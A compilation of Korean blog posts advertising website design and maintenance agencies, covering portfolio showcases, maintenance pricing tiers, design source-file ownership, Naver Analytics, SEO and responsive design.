업체가 도와주기에안심입니다~필요하실것 같아 번호 남깁니다이 포스팅은 요청에 의해 업로드 됨을 명시합니다.​현대이지웹​​오늘은 현대이지웹에서 제작한 밸류업솔루션회사홈페이지를 소개합니다~밸류업솔루션은 pc제작형으로 디자인을 했고견적폼은 기본폼에서 살짝 변형이 있었습니다.​제일 중요한 유지보수 비용줄이기!밸류업솔루션은 홈페이지의 유지보수를 줄이고빠르고 쉽게 직접 수정하시길 원하셔서페이지 관리기능까지 들어갔습니다~​성북구홈페이지 밸류업솔루션!​  밸류업솔루션 PC제작형​​pc는 깔끔하게 블루 계열로 제작이 완료됐습니다.로고에 비슷한 색깔을 써서 로고와 어울리게홈페이지 디자인을 했습니다.​메인문구는성공적인 시작을 위해,밸류업솔루션과 함께하세요!​밸류업솔루션은 하드웨어 스타트업 성장에도움이 되어 드리는 그런 회사입니다.​​ ​컨설팅/자문​준비해 주신 텍스트를 기반으로 페이지 작업이들어갔습니다.​특별하게 들어가야 할 디자인은 없어최대한 깔끔하고 보기 쉽게!​"아이디어 제품화 과정의 시행착오를 줄이고성공적인 시제품 제작 및 양산 기회를 가질 수 있도록프로세스 기반 제조 솔루션을 제공합니다"​​ 회사소개 갤러리 형식으로 관리!​​회사 소개 부분은 브로슈어 처럼 보일 수 있도록!준비해주신 사진자료들이 있어 페이지 형식보다는갤러리 형식으로 스크롤 없이 자동으로 롤링되게만들어 드렸어요! ​후에 회사가 더욱 성장하거나 업데이트가 필요한경우 유지보수팀에 맡겨 수정하는 것보다직접 보시면서 수정하는게 좋다고 생각되어관리기능까지 넣었네요​수정,추가,삭제 가능!​​ ​다음은 파트너메뉴의 파트너들 관리!파트너, 파트너사는 언제든 바뀔 수 있기에언제든 수정이 가능하도록 요청을 주셨어요~추가되고 수정하고 삭제할 수 있도록​그리고 각 개인의 경력이 좋아 경력 소개도하고싶다고 요청을 주셔서 팝업으로 프로필 보기를만들어드렸어요!​ ​이렇게 개개인마다 프로필보기를 할 수 있도록기능을 개발했습니다~​ ​출력순서 관리,담당자 성함,업무분야컨설팅영역경력학력 및 자격프로필 사진까지!​  © cgower, 출처 Unsplash​성북구홈페이지에서는 개발팀과 디자인팀이함께 작업을 함으로써 편의기능부터 웹프로그램까지원하신 부분은 개발 가능합니다!​14년차 현대이지웹의 개발팀과 디자인 팀의경력으로 밸류업솔루션의 회사홈페이지처럼쉽고 간편한 홈페이지 제작하세요~!​​성북구홈페이지의 밸류업솔루션 홈페이지구경하기!http://www.vus.co.kr/ (주)밸류업솔루션하드웨어 스타트업 성공과 성장을 도와주는 솔루션www.vus.co.kr ​ 네이버 블로그는 맞지만, 확인불가  홈페이지제작및관리 지식 수집! 홈페이지 제작 및 관리를 대행업체에 맡길 시 특장점, 세세히 알아보기       그런 말 있잖아요~ 노력하지 않는 사람에게 미래는 없다!!      오랜만에 또 한번 마음에 새겨봅니다~홈페이지제작및관리에 대해 오늘도 열심히 알아보시는 여러분의 노력에 박수를 보내며홈페이지제작및관리 새로운 정보 시작할게요!!          홈페이지 관리 대행업체는 정기적인 유지보수를 시행하여        만든 사이트를 항상 멋스러운 상태로 운영할 수 있습니다.따로 관리 인력을 뽑지 않으시더라도 되기 때문에 경제적이기도 하답니다.       그리고 홈페이지 관리 대행업체를 이용해 웹사이트를 관리하면 악성코드를 막을 수 있죠.보안서비스가 있기 때문에 악성코드를 제거하고 스팸메일을 줄여주는 등의편의 기능도 받을 수 있기에 관리가 한층 수월해 진답니다.     홈페이지 제작 기업에 문의하여 웹사이트를 제작한다면 이미지 저작권에서 자유롭습니다.홈페이지를 만들 때 이미지가 많이 필요한데 이러한 업체는 전부 저작권에 결함이 없는이미지들을 보관하고 사용하므로 향후 저작권 소송 등의 문제가 적어진답니다.         또한 홈페이지 관리 업체를 사용하는 경우라면 이미지나 디자인 수정을 문의할 수 있습니다.디자이너를 고용하기 어려운 회사들은 이러한 역할을 수행할 수 있기에 상당히 유용하죠.         이외에도 보안이 중대한 홈페이지의 경우는 관리 업체를 쓰는 것이 좋습니다.특히 보안 인력이 빈약한 기업은 대행 업체를 이용하면저렴한 비용으로 홈페이지의 방화벽 등을 강화해서 안전하게 쓸 수 있죠.         홈페이지 제작 및 관리 비용 줄이는 방법에 대해 꼭 알아두세요!         홈페이지는 필수로 필요한 홍보수단이지만, 제작 시 비용 때문에 망설이는 분들이 많지요.하지만 제작기간, 퀄리티, 제작비용 등을 비교한 후 저렴한 금액의 제작업체를 선정한다면,제작 및 관리 비용 대비 좋은 홍보효과를 얻을 수 있습니다.     홈페이지 내 페이지 양이 많을 수록 비싼 제작비용이 발생하게 되는데요.회사소개, 찾아오는길 처럼 유사한 맥락의 메뉴를 단순하게 정리해 한 페이지로 만든다면,페이지 수량이 적기때문에 제작 비용도 줄어들고, 한눈에 보기 편해 관리도 쉽습니다.     그리고 홈페이지 제작 시 클라이언트에게 사이트맵을 대강 준비하면 예상 금액보다 큰 액수의 견적이 산출될 수 있으므로 구체적인 사이트맵과 메뉴 구조도을 제시하는것이 좋아요.근사한 성격의 벤치마킹사이트를 제작업체에 전달하는 것도 제작 비용을 줄일 수 있는 방법입니다.     또한 홈페이지 제작 후에는 지속적인 관리를 위해 도메인, 호스팅, 검색엔진을 등록해야 합니다.   보통 1년 단위로 등록해야 하기 때문에 12개월마다 관리 비용이 발생하게 되죠.이러한 등록비용을 공짜로 제공해주는 업체를 사용하면, 홈페이지 관리 비용을 낮출 수 있어요.      고급스러운 홈페이지 제작으로 지출 대비 최고의 효과를 내고 싶은 분에게    18년의 오랜 업력을 갖춘 드림인터페이스를 적극 추천합니다. 드림인터페이스는 홈페이지/모바일 홈페이지/쇼핑몰 고급형 맞춤 전문 제작업체에요.풍부한 실무 경험의 개발진과 디자이너들이 있어고객 만족 퀄리티로 제작하며, 여러 요구사항까지 적극 반영해 드립니다! 업체 홈페이지 제작 혹은 홈페이지 리뉴얼이 요구되는 시점이라면거품 없는 견적을 제시하는 드림인터페이스에 문의해보세요!       정보를 그냥 바라보는 것 만으로는 도움이 되지 않습니다.자기 스스로 생각하고 이 정보를 어떻게 사용할지 연관시켜야 비로소 좋은 결과를 가져오게 되죠! 오늘 준비한 홈페이지제작및관리에 대한 정보도 그냥 흘려보내지 않으실 거죠?  네이버 블로그는 맞지만, 확인불가홈페이지 / 쇼핑몰 관리 운영 가장 수월한 방법은?         ​​여러분 안녕하세요. 최근 네트워크산업이  발달하면서 소자본 사업자 분들도 ​웹상에서의 이익을 극대화시키기 위해서​​쇼핑몰, 홈페이지, 블로그 등을 운영하는 분들이 많으신데요.  혼자 관리하다보니 어떻게 운영하고 관리해야  하는지 어려워하는 분들이 많으세요.   ​       저도 이쪽 분야에서 전문적으로 일을 하지는  않지만 블로그와 홈페이지를 운영하는 한 사람으로  고민을 하던 중, 네이버에서 '애널리틱스'라는 것을​알고 난 후에는 관리가 상당히 수월해졌습니다.  그럼 우선 애널리틱스에 대해서 알아볼게요!​ ​​      네이버 애널리틱스를 검색하시면 애널리틱스 회원가입 페이지가 나타나는데요. 간단하게 회원가입을 하시면 바로 이용하실 수 있어요.  * 당장 사용할 수 있는 것은 아니고  홈페이지에 대한 각종 정보를 수집하는 시간이 소요되기 때문에 회원가입 후 며칠 정도 후 모두 반영이 된다면 사용할 수 있습니다.​ ​     ​​위와 같은 것들은 각 홈페이지 상에서도  확인할 수 있겠지만, 조금 더 세세하게  사용할 수 있고 여러개의 홈페이지를 동시에 관리하기에도 수월한 장점이 있습니다.           사업자 분들의 경우에는 방문자들이 어떤 페이지를 ​봤는지.. 페이지뷰가 상당히 궁금하실텐데요.​​페이지뷰는 물론이고​페이지당 체류시간까지 확인할 수 있기 때문에  여러가지 정보를 제공 받을 수 있습니다. ​* 네이버 블로그에서도 페이지뷰 확인은 가능하지만​체류시간을 확인하는 기능은 없습니다. 물론 무료로 이용을 하기 때문에 경제적으로도 부담이 덜한 장점이 있죠 ㅎㅎ ​ ​      또한 어떤 운영체제에서 검색을 하고  접속을 하였는지 확인할 수 있는데요.  위와 같은 사항들은 세컨 홈페이지 구축시  좋은 정보로 활용할 수 있습니다.           위와 같이 접속자의 이동경로와 방문흐름까지도  파악을 할 수 있기 때문에 사업의 방향도 제대로 잡을 수 있습니다.        ​​​개인이 운영하는 소규모 사업자분들의 경우에는 홈페이지 운영으로 많은 고민을 하시는데요.  중 대형 사업자 분들의 경우에 홈페이지 관리를​전문적으로 하는 분들에게 의뢰를 맡기고 진행할 수 있지만.. ​ 저희는.. 하나하나 스스로 해야하기 때문에 ... ​ 물론 모든 홈페이지에서 장점을 가질 수는 없겠지만 잘만 활용하면 꽤 효과적인 홈페이지를 운영할 수 있지 않을까요?   ​      위 예시를 보니 남성 의류 쇼핑몰인가 보네요 ㅎㅎ 이렇게 상품거래그래프까지 볼 수 있습니다. 애널리틱스라는 프로그램 자체도 꽤 광범위 하기 때문에  하나 하나 클릭해보면서 어떤 기능이 있는지 확인을 해봐야할 사항입니다.          소자본으로 사업을 하시는 분들에게 좋은 정보가 되길 바래요 ㅎㅎ 그럼 모두 좋은 하루 되세요!   공감 & 덧글 ?.... 네이버 블로그는 맞지만, 확인불가홈페이지 수정을 할 때 꼭 필요한 것이 있습니다.바로 디자인 소스파일입니다.그런데 홈페이지 디자인 소스화일을 보관하고 계시는 분들이 1/3도 안되세요.그게 뭐냐고 물으시는 분들도 계십니다.   디자인 소스파일은 포토샵에서 이미지 작업등을 하면서 생성되는 파일입니다.그림 위에 적힌 글자 내용을 바꾼다던지 이미지 자체를 교체한다고 할 때 꼭 필요합니다.글자 한 자만 바꾸는 경우 다자인 소스 파일이 있으면 간단히 수정되지만 만약.......이 파일이 없으면 새로 작업을 해야 합니다.시간과 돈 낭비입니다.   그래서 홈페이지 제작 계약시 디자인 소스 파일의 제공여부를 꼭 확인하시기 바랍니다.일반적으로 디자인소스 파일은 제작사에서 보관하지만 계약시 특별히 요청하시면 유/무상 제공됩니다.유상이든 무상이든 꼭 챙기셔야 사후 관리하기 편합니다.계약시 아무 언급이 없으면 그냥 제작사에서 보관하는 것이 일반적인 관례입니다.   이렇게 말씀드리면 내 돈 들여 만든 홈페이지인데 왜 디자인 소스파일을 제작사에서 보관하는냐 반문을 하실 분이 계십니다.일반적으로 의뢰인이 제작비를 들여 만든 것은 맞지만 홈페이지 디자인은 창작물이므로 소유권은 제작사에 있고 실행파일(이미지 파일, html파일 등)의 사용권만 의뢰인이 갖습니다.   하지만 홈페이지 제작과 관련 계약을 하실 때 디자인의 소유권에 대해 별도 합의가 있었다면 그 합의에 따르면 될 것입니다.​그러나 홈페이지 제작을 의뢰하시는 경우 디자인 소스파일 제공 여부에 대한 언급하는 경우는 아주 드믑니다.제작사도 이것의 제공 여부에 대한 내용을 사전에 적극적으로 알리지 않습니다.다시말해 제작사에서는 챙겨주지 않으니 알아서 챙겨야 한다는 뜻입니다.   홈페이지를 제작하면 몇 년간은 사용합니다.중간중간 수정할 내용이 발생했을 때 디자인 소스파일이 있으면 수정작업비용을 아주 많이 줄일 수 있습니다.가능한한 챙기시는 것이 좋습니다.   홈페이지유지보수 전문업체 디자인피아홈페이지제작,쇼핑몰제작,홈페이지수정,사이트유지보수,홈페이지관리,프로그램제작,프로그램유지보수,인터넷마케팅,웹컨설팅,인터넷프로모션www.designpia.co.kr ​ 네이버 블로그는 맞지만, 확인불가 © goian, 출처 Unsplash 홈페이지유지보수 / 홈페이지유지관리 어떻게 하면 잘 할 수 있을까요?홈페이지유지보수방법과 비용, 홈페이지유지보수업체 고르는 법을 간단히 안내해 드립니다.  © honest, 출처 Unsplash 홈페이지마다 유지보수 내용이 다릅니다.일단은 내 홈페이지가 어떤 유지보수를 필요로 하는 지를 알아야 합니다.홈페이지가 떠 있기 위한 최소한의 홈페이지유지관리만 필요한 지, 가끔씩 디자인 수정 정도만 필요한 지,정기적인 홈페이지 수정이 필요한 지.(팝업 개시, 상세페이지 제작 등..)  © joannakosinska, 출처 Unsplash 내 홈페이지가 정상적으로 작동되는 것만 원할 경우에는?연 단위로 연 10~20만원대 유지보수만 하면 됩니다.이 가격대로는 서버(호스팅)관리 정도만 들어가는데, 서버의 일시적인 문제, 얘기치 못한 각종 홈페이지 정지 현상을 전문업체가 그때그때 체크하고 그 결과/오류 해결을 해 줄 수 있기 때문입니다.홈페이지는 사람이 만든 SW결과물이고 웹서버HW에 기술적으로 설치해서 유지되는 결과물이기 때문에예기치 못하는 SW오류, HW오류가 발생될 수 있습니다,연 10~20만원이면 월1만원 내외 비용이니, 초고속인터넷 사용료보다도 저렴한 비용으로안심하고 유지관리를 받을 수 있습니다.  © dustinlee, 출처 Unsplash 내 홈페이지가 가끔씩 수정이 필요한 경우에는?내 홈페이지의 연혁이라든지, 일부 제품소개라든지,, 이러한 부분만 수정이 연 2~3회 비정기적으로수정이 필요한 경우라면,,  건바이 건으로 의뢰를 맡기는 것도 좋습니다.건바이 건으로 의뢰를 맡는 홈페이지유지보수업체는 사실 그리 많지 않은데,건바이 건으로 맡기더라도 간혹 홈페이지에 문제가 생기면 이를 점검해줄 수 있는우호적인 관계를 만들어 놓으면 더욱 좋습니다^^  © chuttersnap, 출처 Unsplash 내 홈페이지가 정기적인 수정/관리가 필요한 경우라면?전문 홈페이지유지보수 업체를 통해 월 얼마 형식의 서비스를 받아야 합니다업체마다 서비스 내용이 다른데, 보통 월3~10만원 선에서 진행되며,만약 홈페이지 규모가 크고 전담 형식의 유지관리가 필요하다면 역시 전담관리로 월 백만원이상의 비용으로 전담관리를 받을 수도 있습니다.  © priscilladupreez, 출처 Unsplash 홈페이지유지보수업체들은 대부분 월 얼마 씩의 상품만 존재하는데,잘 찾아보시면 위 3가지 경우를 모두 진행하는 홈페이지유지보수 업체도 존재합니다.  © brucemars, 출처 Unsplash 그리고, 모든 홈페이지를 유지보수가 가능한 것은 아닙니다홈페이지를 애당초 폐쇄형으로 만들었다든지, 너무 오래되어서 리뉴얼이 오히려 나은 경우라든지..이러한 경우에는 아예 유지보수 자체를 받을 수 없는 경우도 있습니다.이때는 차라리 홈페이지리뉴얼을 새롭게 진행하고 새롭게 유지보수를 받는 게 비용적으로 정신적으로 훨씬 유리합니다.  © klimkin, 출처 Pixabay 이러한 전문 홈페이지리뉴얼/ 홈페이지유지보수업체를 찾는다면..여기저기 헤매이지 말고 상담해보세요.언제나 최적의 홈페이지유지보수 방안을 찾고자 하는 업체입니다.​http://www.홈페이지제작.kr 홈페이지제작홈페이지제작 의 기준, 기업 및 단체 웹사이트제작, 1000여 고객사, 10년이상 노하우,www.홈페이지제작.kr 전국 어디서나홈페이지유지보수관련 유선문의도 가능합니다1661-5668​​ 네이버 블로그는 맞지만, 확인불가홈페이지를 만들고 나서 가장 중요한 것은 어떻게 관리를 하느냐 입니다.홈페이지 유지관리, 광고, 팝업, 이벤트 고민하지 마시고, 이안디자인에 맡겨주세요. ﻿ 이안디자인은 고객이 요청한 사항에서는 최대한 빠른 시간안에 답변을 해드리고,요청한 사항에 대해서 신속하게 작업을 처리할 수 있도록 하고 있습니다. ﻿ 관리형태대 상관리내역관리비용비고 실속형관리가 필요하지 않으나, 안정적인 유지가 필요한 홈페이지- 하자보수- 홈페이지를 운영하며 발생될 수 있는 만약의 사태에 대한 공동 대응- 홈페이지의 안정적인 운영- 연단위 5건 이하의 간단한 수정사항 발생월납 : 3만원﻿(VAT별도) 호스팅운영지원 ﻿가능 기본형디자인 관리가 필요한홈페이지- 웹페이지 월 1페이지- 이미지 교체 월 1건- 배너, 팝업공지창 중 월 1건- text 수정 월 1건월납 : 5만원 ﻿(VAT별도) 실속형옵션 ﻿포함 ﻿(이하동일)일반형수정이나, 업데이트가 많지 않은 홍보형 홈페이지- 웝페이지 월 2페이지- 이미지교체 월 2건- 배너, 팝업공지창 중 얼 2건- text 수정 월 2건월납 : 8~12만원﻿(VAT별도) 고급형수정이나 업데이트가 빈번한 교모있는 홈페이지- 웹페이지 월 3페이지- 이미지 교체는 월 3건- 배너, 팝업공지창 중 월 3건- text 수정 월 3건- 게시판 프로그램 오류 수정 (글쓰기, 수정, 삭제 월 2회 등)월납 : 10~15만원﻿(VAT별도) 프리미엄형프로그램 및 디자인 부분에 지속적인 관리가 필요한 홈페이지- 웹페이지 월 4페이지- 이미지 교체는 월 4건- 배너, 팝업공지창 중 월 4건- text 수정 월 4건- 회원/게시판 프로그램 오류 수정 월 3회월납 : 15만원 이상 ﻿(VAT별도) 맞춤형고객사의 요구에 맞추어진 유지보수협의협의  * 관리형태와 포트폴리오는 블로그메뉴 Portfolio를 참조해주세요. 홈페이지 유지보수를 위한 준비사항 - FTP정보 (서버접속정보)- 관리자모드 정보 (관리자모드 접근 위한 아이디와 비밀번호)- 프로그램 개발 언어 및 DB정보 (php, asp, .net, mssql, mysql등의 정보)- 원본파일 유,부 확인 (psd, fla 파일등)- 수정 부분 정리 (수정을 원하신다면 수정하실 내용을 정리, 자료도 준비)* 준비가 힘드시다면 먼저 전화로 문의해주세요. ﻿ ﻿﻿* ﻿이안디자인의 주요Member들은 지금껏 500여개 이상의 웹사이트를 구축/운영/관리 경험을 가지고 있으며, 특히 부산,경남,대구,경북(지역상관없음)지역의 기업체와 관공서를 대상으로 주로 활동하고 있습니다. ﻿* 이안디자인은 (주)이안(현재 휴업)의 Member로부터 시작하여 10여년 이상 경력의 디자이너와 개발자가 함께 하는 프리랜서 그룹입니다. ﻿* 프리랜서 그룹이긴 하지만 완전한 모습의 기업형태를 함께 가지고 있어, 귀하의 오더를 책임과 신뢰로서 수행하면서도 가격경쟁력까지 가지고 있는 진화된 웹에이전시입니다.* 홈페이지 유지관리를 위한 맴버는 2명(디자이너 9년경력 1명, 기획/개발 15년경력 1명)이 항상 상주하고 있으며, 기타 필요시 자체 인력Pool을 활용하여 최상의 홈페이지가 항상 유지/관리/운영될 수 있도록 지원하겠습니다.고양시 홈페이지 제작 어떻게 만들어야 할까요?정해진 기능만을 사용해야 되는 홈페이지가 아닌 내 제품과 서비스 제공에 맞는 홈페이지 기능이 필요합니다.담당자가 직접 홈페이지 관리자 모드에서 꾸준한 관리가 가능하도록 홈페이지에 관리 기능을, 고객의 요청을 반영해야겠죠?​체계적으로 기획되고 마케팅적으로 최적화된 홈페이지가 필요합니다.어떤 분야의 고양시 홈페이지 제작을 찾으세요?공들여 제작된 홈페이지가 통합 포털에서 검색이 잘 되지 않는다면 소용없겠죠.​분야를 불문하고 잘 검색되고, 잘 활용할 수 있는 매체가 필요합니다.검색엔진 최적화가 더욱 떠오르는 이유는 모바일 유저의 급증입니다.​실제로 모바일 유저는 검색엔진에서 2페이지 이상을 넘어가지 않는 경우가 많은데요.이러한 검색 형태를 볼 때 콘텐츠가 검색엔진 상위에 노출되는 것이 기업의 홍보와 직접적인 연관이 있어 보이죠?​이를 악용한 것이 상위 노출 블로그입니다.상위 노출 블로그는 '가짜 트래픽'을 유입시켜 알고리즘에 혼동을 일으켜 상위로 노출시키는 방식입니다.​ ​현재 우리나라는 세계가 인정하는 정보화 강국입니다.어떤 사업을 운영하든 고양시 홈페이지 제작이 필요하게 되었죠.웹의 힘은 그 보편성에 있습니다.​누구나 구애 없이 모든 사람이 접근할 수 있는 것이 필수적입니다.장애의 유무, 성별, 나이, 국적에 상관없이 모든 이들이 그들이 원하는 정보에 접근 및 이용이 가능해야 합니다.​시중에 배포되어 있는 솔루션은 누구나 무료로 내려받아 설치형 블로그로 쓰거나 기업의 홈페이지로 만들어 활용할 수 있는 편리함이 있지만 직접 구상하고 만들고 어느 정도 전문 구성 지식이 있어야 하기 때문에 쉽게 사용되고 있지는 않습니다.​사실 일반인은 직접 고양시 홈페이지 제작을 하기에는 노력과 에너지 그리고 전문지식을 익히는 시간이 들기에 크게 메리트는 없어 보입니다.특히 기업을 대표하는 홈페이지를 만든다면 더욱 퀄리티에 신경 써야 하기에 아무나 만들 수 있는 웹디자인, 프로그램이라면 차별성이 없겠죠.​ ​차별화된 고양시 홈페이지 제작을 위해선 역시 전문가의 도움을 받아야 합니다.홈페이지는 여러분의 기업을 홍보하기 위한 가장 효과적이고 필수적인 비즈니스 수단입니다.​절대 대충 만들지 마세요.지금 이 시간 여러분께서 이 글을 읽으시는 것처럼, 여러분의 기업과 거래를 시작하기 위한 많은 고객들이 여러분 기업의 정보를 찾기 위해 온라인 검색 중이라는 사실을 기억하세요.​쉬지 않고 토의하며 창조적 아이디어를 생산해야 합니다.고양시 홈페이지 제작 목적에 부합하는 효과적인 디자인 및 콘텐츠 전략과 웹 표준 환경에 최적화된 퍼블리싱 그리고 철저히 사용자 편의를 고려한 프로그램이 결합하여 최고의 홈페이지를 완성해 보세요.​폰트와 이미지 등 저작권 준수는 기본이 되어야 합니다.프로그램의 강화된 보안성은 웹 변조, 스팸글 다량 등록에서 자유로운 청정 홈페이지를 유지해야 합니다.​ ​홈페이지 제작만 하면 그만이거나 사라져 버리는 업체와는 인연이 되지 마세요.꾸준히 지속 가능한 사후관리 시스템이 있는 업체가 좋겠죠.입소문으로 입증된 곳은 고객사를 오래도록 이어주는 신뢰의 상징이 아닐까요?​입소문 좋은 고양시 홈페이지 제작 업체를 찾아보세요.경제적인 비용으로 경쟁력 있는 홈페이지를 빠른 시간에 제작해야 하는 경우에 적합한 유형이 있습니다.​자사만의 세련되고 개성 있는 디자인의 홈페이지를 제작해야 하는 경우엔 어떤 홈페이지 유형이 좋을까요?차원이 다른 고급 디자인과 화려한 효과를 이용한 임팩트가 강한 홈페이지가 필요할 때 맞춤형 홈페이지가 필요합니다.​반응형은 PC, 태블릿, 스마트폰 등 다양한 디바이스에 반응하여 최적 화면 해상도를 제공하는 개발 법입니다.홈페이지 하자 보수, 도메인, 웹호스팅 서비스, 기업 이메일, 국내 주요 검색 사이트 등록 대행 및 관리, 스팸 게시물 등록 방지를 위한 서비스, 사이트 정상 운영 및 게시물 정상 관리 모니터링 서비스 등 고려해야 할 게 많습니다.​ ​고양시 홈페이지 제작을 진행하면서 여러 고객님들과 이야기를 나눴습니다.놀랍게도 적지 않은 업체 담당자들께서 "홈페이지 접속이 불안정하고 수정 작업이나 하자 보수 등 관리가 잘되지 않는다"라고 말씀하십니다.​관리 업체의 불친절, 불성실, 울며 겨자 먹기로 유지 보수 비용만 계속 지불하고 계시지는 않나요?많은 비용을 들여 홈페이지를 만들었지만 불만족스러울 뿐 아니라 사후 관리도 엉망이라 늘 스트레스받으시는 분들이 있습니다.​홈페이지는 처음 제작하는 것도 중요하지만 시간이 흐름에 따라 지속적인 보완과 신속한 업데이트를 통해 점점 더 완성도를 높여야 하는 매체임을 잊지 마세요.​ ​초기 자본에 부담 없이 홈페이지를 제작하고 싶으세요?다양한 옵션으로 홈페이지를 제작하고 싶으세요?웹, 모바일의 구분 없이 반응형 웹을 제작하고 싶으세요?​홈페이지, 쇼핑몰 운영에 관련하여 검색광고, 고객 편의 서비스 등 필요한 모든 고민사항을 바로 내일처럼 경청하고 상의하고 해결해드리겠습니다.지난 13년간 고객의 입소문으로 입증되었습니다.​업체 특성 및 유형에 맞게 전문 디자이너가 고양시 홈페이지 제작을 해드립니다.합리적인 가격으로 홈페이지 제작 서비스를 받아보세요.홈페이지 결과물에 대한 소유권을 양도해드립니다.​감사합니다.​  070-8785-8325http://www.adcomm.kr/ 에이디커뮤니케이션홈페이지제작,반응형홈페이지제작,쇼핑몰제작,모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,각종 솔루션 제작,인천홈페이지제작 전문업체.www.adcomm.kr   햇살이 밝은 거리 모습과는 달리막상 밖에 나가니 찬바람과 강풍이 보통이 아니네요.오늘 아침도 홈페이지를 제작하시려고 들르신 고객분과업체 홍보문제를 두고 긴 이야기를 나누었습니다.홈페이지 우리만 없다??​ 바람부는 날 ​현대는 온라인을 통한 커뮤니티가 주를 이루는 사회입니다.쇼핑을 하든업체를 알아보든일단 핸드폰을 들고 검색을 시작하기 마련이죠.가게가 없이 장사를 할 수는 없습니다.일단 사업을 하시는 분이라면온라인에 내 가게를 마련하시는 것이 첫번째 하셔야 할 일입니다.웹타운에서는 여러분의 사업장에 꼭 맞는 적절한 레이아웃과 솔루션프로그램이 탑재된건강한 홈페이지를 제작합니다.​  ​어떤 구성의 홈페이지를 제작하느냐는 사업자의 성장에 큰 분깃점을 만들 수 있습니다.홈페이지를 만들었으니 내 사업이 잘 홍보가 되어승승장구 할까요?결코 그렇지 않습니다.가게는 그냥 가게 일 뿐사업장을 가지고 있다고 저절로 손님들이 모여드는 일은 없습니다.가게를 마련했으면가게를 홍보하고, 고객이 왔을 때 맞이할 준비를 철저히 해 두어야 할 것입니다.저희 웹타운은 오랜 경험과 노하우를 통하여고객의 니드에 맞는 적절한 홍보 방법과키워드선택, 계정 개설등을 도와드리며,합리적인 가격으로 최대의 효과를 볼 수 있는 홍보방법을 제공하여사업장에 맞는 홍보를 하실 수 있도록 도와드립니다.​  ​오래전에 만든 홈페이지가 있어서홈페이지와는 거리가 멀다고 생각하시는 사업자분이 계신다면지금 다시 한 번 홈페이지에 접속해 보시라고 권해 드립니다.서비스가 종료된 익스플로러의 경우고객이 플래시 프로그램 설치허용을 선택하지 않은 경우메뉴자체가 뜨지 않거나오래전에 제작한 메인 플래시가 뜨지 않아 먹통이 되는 경우도 있습니다.​또한 최근에는 모바일과 pc는 물론태블릿,아이패드에도 적절히 반응하는하나의 반응형 페이지로 홈페이지를 볼 수 있습니다.그러나, 10년 20년전 홈페이지를 제작하신 분들에게는모바일에서 글자크기가 너무 작아 보이지 않는 경우가 많습니다.고객이 화면을 넓혀서 볼 확률은 매우 적습니다.웹타운은 하나의 서버페이지안에서 여러개의 모니터 환경,즉 모바일,태블릿,노트북,피시등 어디에서나 적절한 화면 사이즈에 맞게 반응하는반응형 홈페이지를 제작하여 드립니다.고객 한 분 이라도 놓치지 않고빠르게 응대 할 수 있는 웹타운의 노하우를 담아드립니다.​  ​웹타운은 오랜 제작 경험을 바탕으로 신뢰를 쌓아가고 있으며,앞으로도 사업자의 필요를 빠르게 적용하여고객의 방문에서, 매출에 연결되기까지모든 과정을 케어해 드릴 수 있는최선의 서비스를 제공해 드릴것입니다.불필요한 고가의 비용을 낭비하지 마시고오늘 상담전화 꼭 클릭해 보시기 바랍니다 ^^​   ​​  ​ 웹타운강원도 원주시 단구로 207 1층  ​​​#홈페이지제작 #원주개인사업자홈페이지 #홈페이지관리 #홍보 #키워드검색 #원주홈페이지제작  네이버 블로그는 맞지만, 확인불가  ​   메이크홈즈 내가 몰랐던 홈페이지 제작 및 관리 관련 알찬 정보팩트만 말한다! 홈페이지 부가서비스 뉴스     좋은 일을 시작하는 것도 물론 중하지만 동요하지 않고 이겨내는 것이 더 중요한 법이죠.공부도 마찬가지인데요. 중도에 멈추는 일 없이 지속적으로 진행하려는 마음이 더욱 필요하답니다.끈기 있는 여러분을 위한 홈페이지 제작 및 관리 관련 정보, 이제 알아볼까요?기본적인 솔루션형 홈페이지의 경우, 저렴한 가격으로 제작할 수 있지만디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 적합한 홈페이지 관리가 필요하거나지속적인 관리하기가 필요한 홈페이지의 경우, 맞춤형 서비스를 이용해 보는 것이 좋습니다​부정클릭이란 광고비를 급속도로 소진하게 하려는 악의적인 계획을 가지고 마구잡이로 클릭하는 것을 말하는데, 홈페이지 관리비가 많이 들어갈 수 있기 때문에 로그분석을 통해 파악하는 것이 좋습니다.​로그분석은 홈페이지의 실적을 측정하기 위해 필요한 방문자 정보, 트래픽, 사이트 이동 경로 등의 데이터를 살펴볼 수 있는 분석 수단으로 이를 활용하여 사이트 보안이나 이벤트, 유입 전략 등을 형성할 수 있습니다.​로그분석 데이터는 홈페이지의 운영 형태나 마케팅 계획을 수립하는 자료로 활용할 수 있습니다.​   로그분석에 활용되는 액세스로그는 본인 업체의 홈페이지에 접속한 방문객들이 홈페이지를 돌아다니며 요청했던 파일들을 기록해 놓은 목록입니다. 액세스로그의 자료를 분석하여 홈페이지에 접속한 타깃층의 선호도를 파악할 수도 있습니다.​​   ​   편하게 알아보는 홈페이지 빌더     홈페이지 빌더는 단시간 내에 쉽게 홈페이지를 만들 수 있는 서비스입니다.원하는 스타일의 홈페이지 스킨을 선택한 후 카테고리나 내용, 사진 등을 간단하게 수정하면곧바로 사용이 가능한 홈페이지를 만들 수 있습니다.​맞춤형과 템플릿 형 홈페이지의 장단점을 이용한 방법이 바로 홈페이지 빌더입니다.완성도 높은 디자인으로 저렴한 비용으로 홈페이지를 제작할 수 있기 때문인데요.요즘엔 새로운 디자인의 레이아웃을 제공하는 업체가 증가하고 있고,직접 만든 스킨을 적용할 수도 있어, 고급스러운 홈페이지 제작도 가능해졌습니다.​최근에, 여러 크기의 디바이스들의 등장으로 디스플레이의 종류에 따라 화면 크기가 자동 조절되는 반응형 홈페이지 빌더가 생성되었습니다.반응형 홈페이지 빌더를 이용하면, 하나의 홈페이지를 제작하여모바일이나 PC, 태블릿 등 모든 기기에서 최적의 사이즈와 해상도로 구현할 수 있습니다.​디자인 능력이나 프로그래밍 지식이 없다고 해도 홈페이지를 쉽게 만들 수 있는데요.홈페이지 빌더를 사용하면 기본적으로 제공되는 홈페이지 디자인에서사용자가 알아서 내용과 사진을 수정할 수 있고, 주기적으로 홈페이지를 관리할 수도 있습니다.   홈페이지 빌더를 이용해 저렴한 비용으로 간편히 홈페이지를 만들 수 있습니다. 업종별로 다양한 레이아웃 중에 원하는 디자인을 골라서 손쉽게 완성도 높은 홈페이지 제작이 가능하며,직접 만든 디자인을 적용할 수도 있어 개성 있는 연출도 가능합니다.​​   ​우리 업체를 더 쉽게, 더 대대적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 